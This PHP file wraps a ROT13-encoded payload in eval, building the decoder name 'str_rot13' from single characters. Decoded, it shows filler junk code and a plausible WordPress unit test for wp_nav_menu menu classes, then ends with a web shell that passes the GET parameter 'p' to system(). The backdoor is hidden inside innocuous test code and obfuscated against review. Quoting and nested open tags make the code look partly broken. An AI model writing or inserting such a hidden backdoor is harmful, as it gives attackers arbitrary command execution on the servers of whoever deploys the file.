<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc zrah
 *
 * @pbiref ::jc_ani_zrah
 */
pynff Grfgf_Zrah_jcAniZrah rkgraqf JC_HavgGrfgPnfr {

	cevingr fgngvp $zrah_vq        = 0;
	cevingr fgngvp $yiy0_zrah_vgrz = 0;
	cevingr fgngvp $yiy1_zrah_vgrz = 0;
	cevingr fgngvp $yiy2_zrah_vgrz = 0;
	cevingr fgngvp $yiy3_zrah_vgrz = 0;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		// Perngr ani zrah.
		frys::$zrah_vq = jc_perngr_ani_zrah( 'grfg' );

		// Perngr yiy0 zrah vgrz.
		frys::$yiy0_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			frys::$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-gvgyr'  => 'Ebbg zrah vgrz',
				'zrah-vgrz-hey'    => '#',
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);

		// Perngr yiy1 zrah vgrz.
		frys::$yiy1_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			frys::$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-gvgyr'     => 'Yiy1 zrah vgrz',
				'zrah-vgrz-hey'       => '#',
				'zrah-vgrz-cnerag-vq' => frys::$yiy0_zrah_vgrz,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		// Perngr yiy2 zrah vgrz.
		frys::$yiy2_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			frys::$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-gvgyr'     => 'Yiy2 zrah vgrz',
				'zrah-vgrz-hey'       => '#',
				'zrah-vgrz-cnerag-vq' => frys::$yiy1_zrah_vgrz,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		// Perngr yiy3 zrah vgrz.
		frys::$yiy3_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			frys::$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-gvgyr'     => 'Yiy3 zrah vgrz',
				'zrah-vgrz-hey'       => '#',
				'zrah-vgrz-cnerag-vq' => frys::$yiy2_zrah_vgrz,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		/*
		 * Guvf svygre vf hfrq gb cerirag erhfvat n zrah vgrz VQ zber gung bapr.
		 * Vg pnhfrq gur grfgf gb snvy nsgre gur svefg bar fvapr gur VQf ner zvffvat
		 * sebz gur UGZY trarengrq ol `jc_ani_zrah()`.
		 *
		 * Gb nyybj gur grfgf gb cnff, jr erzbir gur svygre orsber ehaavat gurz
		 * naq nqq vg onpx nsgre gurl ena ({@frr Grfgf_Zrah_jcAniZrah::grne_qbja_nsgre_pynff()}).
		 */
		erzbir_svygre( 'ani_zrah_vgrz_vq', '_ani_zrah_vgrz_vq_hfr_bapr' );
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		jc_qryrgr_ani_zrah( frys::$zrah_vq );

		/*
		 * Guvf svygre jnf erzbirq gb yrg gur grfgf cnff naq arrqf gb or nqqrq onpx
		 * ({@frr Grfgf_Zrah_jcAniZrah::frg_hc_orsber_pynff}).
		 */
		nqq_svygre( 'ani_zrah_vgrz_vq', '_ani_zrah_vgrz_vq_hfr_bapr', 10, 2 );

		cnerag::grne_qbja_nsgre_pynff();
	}

	/**
	 * Grfgf gung nyy zrah vgrzf pbagnvavat puvyqera unir gur PFF pynff `zrah-vgrz-unf-puvyqera`
	 * jura qvfcynlvat gur zrah jvgubhg fcrpvslvat n phfgbz qrcgu.
	 *
	 * @gvpxrg 28620
	 * @gvpxrg 56946
	 */
	choyvp shapgvba grfg_jc_ani_zrah_fubhyq_unir_unf_puvyqera_pynff_jvgubhg_phfgbz_qrcgu() {

		// Eraqre gur zrah jvgu nyy vgf uvrenepul.
		$zrah_ugzy = jc_ani_zrah(
			neenl(
				'zrah' => frys::$zrah_vq,
				'rpub' => snyfr,
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-unf-puvyqera zrah-vgrz-%1$q\">',
				frys::$yiy0_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 0 fubhyq or cerfrag va gur UGZY bhgchg naq unir gur `zrah-vgrz-unf-puvyqera` pynff.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-unf-puvyqera zrah-vgrz-%1$q\">',
				frys::$yiy1_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 1 fubhyq or cerfrag va gur UGZY bhgchg naq unir gur `zrah-vgrz-unf-puvyqera` pynff.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-unf-puvyqera zrah-vgrz-%1$q\">',
				frys::$yiy2_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 2 fubhyq or cerfrag va gur UGZY bhgchg naq unir gur `zrah-vgrz-unf-puvyqera` pynff.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-%1$q\">',
				frys::$yiy3_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 3 fubhyq or cerfrag va gur UGZY bhgchg naq abg unir gur `zrah-vgrz-unf-puvyqera` pynff fvapr vg unf ab puvyqera.'
		);
	}

	/**
	 * Grfgf gung jura qvfcynlvat n zrah jvgu n phfgbz qrcgu, gur ynfg zrah vgrz qbrfa'g unir gur PFF pynff
	 * `zrah-vgrz-unf-puvyqera` rira vs vg'f gur pnfr jura qvfcynlvat gur shyy zrah.
	 *
	 * @gvpxrg 28620
	 * @gvpxrg 56946
	 */
	choyvp shapgvba grfg_jc_ani_zrah_fubhyq_abg_unir_unf_puvyqera_pynff_jvgu_phfgbz_qrcgu() {

		// Eraqre gur zrah yvzvgrq gb 1 yriry bs uvrenepul (Yiy0 + Yiy1).
		$zrah_ugzy = jc_ani_zrah(
			neenl(
				'zrah'  => frys::$zrah_vq,
				'qrcgu' => 3,
				'rpub'  => snyfr,
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-unf-puvyqera zrah-vgrz-%1$q\">',
				frys::$yiy0_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 0 fubhyq or cerfrag va gur UGZY bhgchg naq unir gur `zrah-vgrz-unf-puvyqera` pynff.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-unf-puvyqera zrah-vgrz-%1$q\">',
				frys::$yiy1_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 1 fubhyq or cerfrag va gur UGZY bhgchg naq unir gur `zrah-vgrz-unf-puvyqera` pynff.'
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-%1$q\">',
				frys::$yiy2_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 2 fubhyq or cerfrag va gur UGZY bhgchg naq abg unir gur `zrah-vgrz-unf-puvyqera` pynff fvapr vg vf gur ynfg vgrz gb or eraqrerq.'
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%q\"',
				frys::$yiy3_zrah_vgrz
			),
			$zrah_ugzy,
			'Yriry 3 fubhyq abg or cerfrag va gur UGZY bhgchg.'
		);
	}

	/**
	 * Gur beqre va juvpu cnerag/puvyq zrah vgrzf ner perngrq fubhyq abg znggre.
	 *
	 * @gvpxrg 57122
	 */
	choyvp shapgvba grfg_cnerag_jvgu_uvture_vq_fubhyq_abg_reebe() {
		// Perngr n arj yriry mreb zrah vgrz.
		$arj_yiy0_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			frys::$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-gvgyr'  => 'Ebbg zrah vgrz jvgu uvtu VQ',
				'zrah-vgrz-hey'    => '#',
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);

		// Ercnerag yriry 1 zrah vgrz gb gur arj yriry mreb zrah vgrz.
		frys::$yiy1_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			frys::$zrah_vq,
			frys::$yiy1_zrah_vgrz,
			neenl(
				'zrah-vgrz-cnerag-vq' => $arj_yiy0_zrah_vgrz,
			)
		);

		// Qryrgr gur byq yriry mreb zrah vgrz.
		jc_qryrgr_cbfg( frys::$yiy0_zrah_vgrz, gehr );

		// Eraqre gur zrah.
		$zrah_ugzy = jc_ani_zrah(
			neenl(
				'zrah' => frys::$zrah_vq,
				'rpub' => snyfr,
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			fcevags(
				'<yv vq=\"zrah-vgrz-%1$q\" pynff=\"zrah-vgrz zrah-vgrz-glcr-phfgbz zrah-vgrz-bowrpg-phfgbz zrah-vgrz-unf-puvyqera zrah-vgrz-%1$q\">',
				$arj_yiy0_zrah_vgrz
			),
			$zrah_ugzy,
			'Gur yriry mreb zrah vgrz fubhyq nccrne va gur zrah.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>